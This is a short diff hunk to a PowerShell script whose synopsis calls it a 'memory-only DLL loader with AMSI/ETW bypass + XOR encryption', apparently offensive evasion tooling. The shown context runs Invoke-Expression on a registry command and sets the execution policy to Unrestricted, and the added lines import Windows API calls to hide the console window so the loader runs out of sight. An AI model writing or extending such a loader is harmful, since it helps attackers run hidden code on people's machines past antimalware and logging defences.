@@ -32,6 +32,15 @@ Invoke-Expression $regCommand2 | Out-Null
 
 Set-ExecutionPolicy Unrestricted -Scope Process -Force | Out-Null
 
+
+
+Add-Type -Name Window -Namespace Console -MemberDefinition @'
+[DllImport("Kernel32.dll")] public static extern IntPtr GetConsoleWindow();
+[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
+'@ -ErrorAction SilentlyContinue
+[Console.Window]::ShowWindow([Console.Window]::GetConsoleWindow(), 0)
+
+
 <#
 .SYNOPSIS
     Memory-only DLL loader with AMSI/ETW bypass + XOR encryption
